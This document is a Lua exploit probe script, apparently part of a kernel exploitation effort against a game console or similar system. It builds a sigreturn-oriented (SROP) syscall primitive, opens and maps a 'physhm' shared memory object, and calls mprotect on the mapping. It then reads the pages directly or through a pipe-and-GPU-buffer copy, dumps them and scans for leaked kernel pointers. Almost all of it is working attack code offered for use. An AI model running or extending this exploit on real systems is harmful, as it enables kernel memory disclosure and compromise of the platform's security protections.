-- CRASH_CLASS: LOW
-- PROBE 176a: Read physhm pages after mprotect(PROT_READ)
--
-- 175a: mprotect(PROT_READ) returned 0 on physhm mapped pages!
-- The probe crashed because it used truncated 32-bit address.
-- This probe uses the full uint64 address to read after mprotect.
--
-- If we can read the physhm contents, this is a kernel data leak.

print("=== PROBE 176a: PHYSHM MPROTECT READ ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- Step 1: Open physhm
print("--- STEP 1: PHYSHM_OPEN ---")
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local fd = rv and to_num(rv) or -1
print("fd=" .. fd)
if fd < 0 then
    print("FAILED")
    return
end

-- Step 2: mmap physhm (0x4000 = 1 page)
print("")
print("--- STEP 2: MMAP ---")
local sc_mmap = make_syscall(477)
local ok_mm, mm_rv = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(fd), uint64(0))
end)
if not ok_mm then
    print("mmap PCALL-FAIL")
    return
end

local mm_h, mm_l = get_hi_lo(mm_rv)
print("mmap=" .. hex64(mm_rv))

if mm_h == 0 and mm_l == 0 then
    print("NULL")
    return
end

-- Build the full uint64 address
local physhm_va = uint64(string.format("0x%X%08X", mm_h, mm_l))

-- Step 3: mprotect to PROT_READ
print("")
print("--- STEP 3: MPROTECT ---")
rv = srop(74, physhm_va, uint64(0x4000), uint64(1))  -- PROT_READ
local mp_ret = rv and to_num(rv) or -999
print("mprotect(PROT_READ)=" .. mp_ret)

if mp_ret ~= 0 then
    print("mprotect FAILED")
    return
end

-- Step 4: READ THE DATA!
print("")
print("--- STEP 4: READ PHYSHM DATA ---")

-- Try reading with pcall using full uint64 address
local read_ok = false
local first_qword = nil

local ok, val = pcall(function()
    return memory.read_qword(physhm_va)
end)
if ok then
    read_ok = true
    first_qword = val
    print(">>> PHYSHM READ SUCCEEDED <<<")
    print("first qword: " .. hex64(val))
else
    print("read_qword(physhm_va) FAILED: " .. tostring(val))
    -- Try with numeric address
    ok, val = pcall(function()
        return memory.read_dword(physhm_va)
    end)
    if ok then
        read_ok = true
        print("read_dword OK: 0x" .. string.format("%X", to_num(val)))
    else
        print("read_dword also FAILED")
    end
end

if not read_ok then
    print("User read still faults after mprotect")
    print("Testing copyin via write(pipe)...")

    -- Create pipe
    rv = srop(42)
    local pipe_rd = rv and to_num(rv) or -1
    print("pipe=" .. pipe_rd)

    if pipe_rd >= 0 then
        rv = srop(4, uint64(pipe_rd + 1), physhm_va, uint64(0x100))
        local wr = rv and to_num(rv) or -999
        print("write(pipe, physhm, 256)=" .. wr)

        if wr > 0 then
            print(">>> COPYIN SUCCEEDED AFTER MPROTECT <<<")
            -- GPU for reading pipe data
            local _, gpu = pcall(function()
                return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
                    uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
            end)
            local gh2, gl2 = get_hi_lo(gpu)
            local function ga2(off)
                return uint64(string.format("0x%X%08X", gh2, gl2 + off))
            end

            rv = srop(3, uint64(pipe_rd), ga2(0), uint64(wr))
            local got = rv and to_num(rv) or -1
            print("recv=" .. got)

            if got > 0 then
                -- Dump and scan
                print("first 128 bytes:")
                for row = 0, math.min(7, math.floor((got-1)/16)) do
                    local line = string.format("  +%03X:", row * 16)
                    for i = 0, 15 do
                        local off = row * 16 + i
                        if off < got then
                            local dw = to_num(memory.read_dword(gpu + (off - off%4)))
                            local b = math.floor(dw / (256 ^ (off%4))) % 256
                            line = line .. string.format(" %02X", b)
                        end
                    end
                    print(line)
                end

                local kptr_count = 0
                for off = 0, got - 8, 8 do
                    local qv = memory.read_qword(gpu + off)
                    local qh, ql2 = get_hi_lo(qv)
                    if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                        kptr_count = kptr_count + 1
                        print("  *** KPTR +" .. string.format("%04X", off) ..
                            "=" .. hex64(qv))
                    end
                end
                print("kernel pointers: " .. kptr_count)
            end
        end
        srop(6, uint64(pipe_rd))
        srop(6, uint64(pipe_rd + 1))
    end
else
    -- Direct read works! Dump the whole page
    print("")
    print("--- FULL PAGE DUMP ---")
    local kptr_count = 0
    local nz_count = 0

    for off = 0, 0x3FF8, 8 do
        local ok2, qval = pcall(function()
            local addr = uint64(string.format("0x%X%08X", mm_h, mm_l + off))
            return memory.read_qword(addr)
        end)
        if ok2 then
            local qh, ql2 = get_hi_lo(qval)
            if qh ~= 0 or ql2 ~= 0 then
                nz_count = nz_count + 1
                if nz_count <= 32 then
                    print(string.format("  +%04X: %s", off, hex64(qval)))
                end
                if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                    kptr_count = kptr_count + 1
                    print("    *** KERNEL POINTER ***")
                end
            end
        else
            print(string.format("  +%04X: FAULT", off))
            break
        end
    end

    print("")
    print("non-zero qwords: " .. nz_count)
    print("kernel pointers: " .. kptr_count)

    -- Try different mmap offsets
    print("")
    print("--- DIFFERENT OFFSETS ---")
    for _, test_off in ipairs({0x4000, 0x8000, 0x10000, 0x100000}) do
        local ok3, mm2 = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(1), uint64(fd), uint64(test_off))
        end)
        if ok3 then
            local m2h, m2l = get_hi_lo(mm2)
            if m2h ~= 0 or m2l ~= 0 then
                local m2va = uint64(string.format("0x%X%08X", m2h, m2l))
                -- mprotect it
                srop(74, m2va, uint64(0x4000), uint64(1))
                -- Try reading
                local ok4, v4 = pcall(function()
                    return memory.read_qword(m2va)
                end)
                if ok4 then
                    print(string.format("  off=0x%X: %s", test_off, hex64(v4)))
                    local v4h = get_hi_lo(v4)
                    if v4h >= 0xFFFF8000 and v4h < 0xFFFFFFFF then
                        print("    *** KERNEL POINTER ***")
                    end
                else
                    print(string.format("  off=0x%X: fault", test_off))
                end
                srop(73, m2va, uint64(0x4000))
            else
                print(string.format("  off=0x%X: NULL", test_off))
            end
        end
    end
end

-- Cleanup
srop(73, physhm_va, uint64(0x4000))  -- munmap
srop(6, uint64(fd))                    -- close

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
